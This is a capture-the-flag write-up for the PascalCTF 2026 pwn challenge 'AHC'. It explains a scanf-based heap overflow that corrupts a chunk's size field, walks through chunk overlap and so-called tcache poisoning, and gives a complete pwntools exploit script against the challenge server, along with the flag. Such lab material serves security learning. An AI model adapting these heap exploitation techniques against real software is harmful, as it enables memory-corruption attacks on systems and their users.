---
title: "AHC - PascalCTF 2026"
date: 2026-01-31
draft: false
description: "Writeup for AHC from PascalCTF 2026"
tags:
    - "pwn"
showToc: true
TocOpen: false
hidemeta: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowCodeCopyButtons: true

author: "benjamin"
---

## Challenge Info

| Property | Value |
|----------|-------|
| **CTF** | PascalCTF 2026 |
| **Challenge** | Heap |
| **Category** | Pwn |
| **Points** | 450+ |
| **Solves** | idk |

---

## Description

> idk honestly

**Files provided:**
- `average`
- `libc.so.6`
- `ld-linux-x86-64.so.2`

**Connection info:**
```
nc ahc.ctf.pascalctf.it 9003
```

### Vulnerability Discovery

Before diving into the exploitation steps, let's analyze the vulnerable function responsible for the bug. The core issue is in the way the program handles user input for the message field. The function responsible for reading the message does not properly check the length of the input, and uses a `scanf("%s", ...)`, which stops reading at the first null byte but does not prevent the user from overflowing the intended buffer size. This means that if the user provides more data than the buffer can hold, the excess bytes will overwrite adjacent memory regions.

In the context of heap management, this overflow allows an attacker to overwrite the metadata of the next heap chunk, specifically the size field. By carefully crafting the input, it is possible to set the size of the next chunk to an arbitrary value, which is a classic heap overflow vulnerability. This is particularly dangerous because it enables advanced exploitation techniques such as tcache poisoning and chunk overlap, which can ultimately lead to arbitrary code execution or information disclosure.

The vulnerable logic can be summarized as follows:

```python
msg_overflow = b'C' * 0x20 + p64(0x71)[:7]  # Overflows into next chunk's size
```

## Solution

### Step 1: Heap Setup

Allocate three chunks to fill up the initial heap and make chunk placement predictable.

```python
create(io, i, 0, b'X', b'Y')
```

### Step 2: Heap Overflow

```python
size_bytes = p64(0x71)[:7]
msg_overflow = b'C' * 0x20 + size_bytes
create(io, 3, 0, b'A' * 0x27, msg_overflow)
```

### Step 3: Tcache Poisoning

Allocate and free the corrupted chunk to place it in the tcache bin, then reallocate to overlap and control sensitive data.

```python
create(io, 4, 0, b'X', b'Y')
delete(io, 4)
name = b'E' * 0x38
payload = b'F' * 0x17 + p64(0xdeadbeefcafebabe) + b'G' * 0x8
create(io, 4, 17, name, payload)
```

### Final Exploit

```python
#!/usr/bin/env python3
"""
Exploit for Heap - PascalCTF 2026
Author: benjamin
"""

from pwn import *

HOST = 'ahc.ctf.pascalctf.it'
PORT = 9003

context.log_level = 'info'


def menu(io, choice):
    io.sendlineafter(b'> ', str(choice).encode())


def create(io, idx, extra, name, message):
    menu(io, 1)
    io.sendlineafter(b'index', str(idx).encode())
    io.sendlineafter(b'more', str(extra).encode())
    io.sendafter(b'name: ', name + b'\n')
    io.sendafter(b'message: ', message + b'\n')


def delete(io, idx):
    menu(io, 2)
    io.sendlineafter(b'index', str(idx).encode())


def main():
    io = remote(HOST, PORT)

    for i in range(3):
        create(io, i, 0, b'X', b'Y')

    size_bytes = p64(0x71)[:7]  
    msg_overflow = b'C' * 0x20 + size_bytes
    create(io, 3, 0, b'A' * 0x27, msg_overflow)

    create(io, 4, 0, b'X', b'Y')

    delete(io, 4)

    name = b'E' * 0x38
    payload = b'F' * 0x17 + p64(0xdeadbeefcafebabe) + b'G' * 0x8
    create(io, 4, 17, name, payload)

    menu(io, 5)
    io.interactive()


if __name__ == '__main__':
    main()
```

---

## Flag

```
pascalCTF{1m4g1n3_N0t_Kn0w1n9_H34P...}
```

---

## Takeaways

- Heap overflows and tcache poisoning are still super fun
- Always check your input lengths 
- Messing with chunk metadata never gets old

# Notes

- For the chunk overlap, I allocated C4 after corrupting its size (0x71 instead of the original value).
- Then I re-allocated a chunk of size 0x70, which let me overwrite sensitive data and prep the payload for the win.
- The overflow itself was just 39 bytes into the message field of C3, with the last 7 bytes being the corrupted size for the next chunk.

## 🔗 References

* [Heap Exploitation by ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/heap)